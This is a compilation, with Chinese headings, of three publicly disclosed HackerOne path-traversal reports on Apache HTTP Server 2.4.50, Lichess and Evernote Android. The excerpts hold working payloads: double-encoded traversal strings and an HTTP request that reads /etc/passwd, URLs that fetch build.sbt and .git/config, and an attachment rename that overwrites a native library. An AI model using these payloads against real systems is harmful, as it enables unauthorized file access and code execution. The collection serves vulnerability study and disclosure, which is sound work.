# HackerOne 实战案例：path-traversal

_3 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50
- 等级：Critical | 项目：Internet | 披露：2021-11-19 | CVE：CVE-2021-42013
- 原文：https://hackerone.com/reports/1404731

- - - - - - - - 
Hello Apache team,
@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.
These are the payloads:
1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65
PoC Path Traversal
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,a


## Path Traversal Vulnerability in Lila Project
- 等级：High | 项目：Lichess | 披露：2025-06-09 | CVE：-
- 原文：https://hackerone.com/reports/3181066

- - - - - - - - 
## Summary:
A path traversal vulnerability was discovered in the Lila project that allows an attacker to access arbitrary files on the server by manipulating user-supplied input to traverse outside the intended directory structure. This flaw could potentially expose sensitive files such as application source code, configuration files, or other data not meant for public access.
## Steps To Reproduce:
[add details for how we can reproduce the issue]
code url
lila-master/conf/routes,line 939
{F4420388}
poc
https://lichess.org/assets/../build.sbt
{F4420380}
https://lichess.org/assets/../.git/config
{F4420382}
## Supporting Material/References:
[list any additional material (e.g.


## 2 click Remote Code execution in Evernote Android
- 等级：High | 项目：Evernote | 披露：2022-03-29 | CVE：-
- 原文：https://hackerone.com/reports/1377748

- - - - - - - - 
This vulnerability is similar to my previous reported vulnerability #1362313 , in here also weakness is path transversal  vulnerability which helps me to acheive code execution but the root cause is different.
some part of this app is written in java and some parts are written in react native. 
In evernote we can share notes and notebooks with others. In  notes we can also add attachments and there is option to rename the added attachment. When renaming i founded that special characters are not restricted,for example file uploaded with name `libjnigraphics.so`  can be renamed to `../../../lib-1/libjnigraphics.so` and when the attachment is downloaded it is downloaded with fi

